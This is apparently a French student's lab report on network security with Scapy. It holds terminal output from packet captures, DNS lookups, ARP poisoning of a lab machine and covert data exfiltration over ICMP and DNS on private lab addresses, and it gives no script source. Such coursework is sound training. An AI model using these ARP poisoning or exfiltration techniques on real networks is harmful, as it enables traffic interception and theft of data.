TP4 SECU : Exfiltration

I. Getting started Scapy

🌞 ping.py
```
$ sudo python3 ping.py
Begin emission:
Finished sending 1 packets.
.*
Received 2 packets, got 1 answers, remaining 0 packets
Answers :
 - QueryAnswer(query=<IP  frag=0 proto=icmp src=192.168.56.5 dst=192.168.56.1 |<ICMP  type=echo-request |>>, answer=<IP  version=4 ihl=5 tos=0x0 len=28 id=62475 flags= frag=0 ttl=64 proto=icmp chksum=0x957e src=192.168.56.1 dst=192.168.56.5 |<ICMP  type=echo-reply code=0 chksum=0x0 id=0x0 seq=0x0 |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>>)
```
🌞 tcp_cap.py
```
$ sudo python3 tcp_cap.py
TCP SYN ACK reçu !
- Adresse IP src : 142.250.179.78
- Adresse IP dst : 10.0.2.15
- Port TCP src : 443
- Port TCP dst : 47168
```

🌞 dns_cap.py
```
$ sudo python3 dns_cap.py
104.26.11.233 ; 172.67.74.226 ; 104.26.10.233 ;
```
```
$ dig ynov.com

; <<>> DiG 9.19.17-1-Debian <<>> ynov.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 54956
;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;ynov.com.			IN	A

;; ANSWER SECTION:
ynov.com.		2	IN	A	104.26.11.233
ynov.com.		2	IN	A	172.67.74.226
ynov.com.		2	IN	A	104.26.10.233

;; Query time: 8 msec
;; SERVER: 192.168.1.1#53(192.168.1.1) (UDP)
;; WHEN: Thu Oct 24 15:52:33 CET 2024
;; MSG SIZE  rcvd: 85
```

🌞 dns_lookup.py
```
$ sudo python3 dns_lookup.py
104.26.10.233 ; 104.26.11.233 ; 172.67.74.226 ;
```

II. ARP Poisoning


🌞 arp_poisoning.py

- Depuis le pc cible :
```
$ ip a | grep 'inet ' | grep vboxnet0
    inet 192.168.56.1/24 brd 192.168.56.255 scope global vboxnet0
$ ip n s | grep 10.13.33.37
```

- Sur le pc attaquant :
```
$ ip a | grep 'inet ' | grep eth0 
    inet 192.168.10.5/24 brd 192.168.10.255 scope global dynamic noprefixroute eth0
$ sudo python3 arp_poisoning.py   
poisoning ongoing...
```

- sur le pc cible
```
$ ip n s | grep 10.13.33.37
10.13.33.37 dev vboxnet0 lladdr de:ad:be:ef:ca:fe STALE
```

III. Exfiltration ICMP

🌞 icmp_exf_send.py
```
$ sudo python3 icmp_exf_send.py 192.168.56.1 t
.
Sent 1 packets.
```
🌞 icmp_exf_receive.py
```
$ sudo python3 icmp_exf_send.py 192.168.56.5 t
.
Sent 1 packets.
```
```
$ sudo python3 icmp_exf_rcv.py
t
```
⭐ Bonus 1 easy :
```

```

IV. Exfiltration DNS

🌞 dns_exfiltration_send.py
```
$ sudo python3 dns_exfiltration_send.py 192.168.56.1 je_suis_en_train_de_faire_un_truc_et_voila
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
```